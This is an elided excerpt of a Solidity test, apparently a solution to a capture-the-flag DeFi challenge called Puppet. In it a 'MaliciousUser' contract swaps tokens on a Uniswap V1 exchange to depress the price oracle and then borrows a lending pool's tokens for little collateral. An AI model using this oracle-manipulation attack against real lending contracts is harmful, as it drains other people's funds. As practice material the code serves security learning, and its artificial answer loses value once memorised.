...
contract PuppetChallenge is Test {
    ...
    function test_puppet1() public checkSolvedByPlayer {
        MaliciousUser attacker = new MaliciousUser{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange, recovery);
...
contract MaliciousUser {
    ...
    function attack(uint256 targetAmount) public {
        uint256 balanceToken = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), balanceToken);
        uniswapV1Exchange.tokenToEthTransferInput(balanceToken, 9, block.timestamp, address(this));
        lendingPool.borrow{value: address(this).balance}(targetAmount, recovery);
    }
